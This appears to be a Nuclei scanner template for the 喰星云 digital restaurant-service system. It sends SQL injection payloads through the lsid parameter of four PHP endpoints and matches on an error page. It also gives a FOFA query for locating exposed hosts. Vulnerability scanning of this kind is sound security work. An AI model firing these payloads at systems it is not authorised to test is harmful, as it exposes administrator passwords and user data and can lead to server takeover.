http:
    - matchers:
        - part: body
          type: word
          words:
            - 服务器内部错误，请与管理员联系，谢谢
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(SELECT%20(CASE%20WHEN%20(5630=5631)%20THEN%202%20ELSE%20(SELECT%207330%20UNION%20SELECT%203010)%20END)) HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /logistics/home_warning/php/shelflife.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /logistics/home_warning/php/not_finish.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /logistics/home_warning/php/stock.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
          Host: {{Hostname}}
id: canxingyun-not_out_depot-shelflife-not_finish-stock-sql
info:
    author: Superhero
    description: |-
        fofa: body="tmp_md5_pwd"
        喰星云·数字化餐饮服务系统 not_out_depot.php、shelflife.php、not_finish.php、stock.php等多处接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 喰星云·数字化餐饮服务系统 多处 SQL注入漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140541777
    severity: high
    tags: []
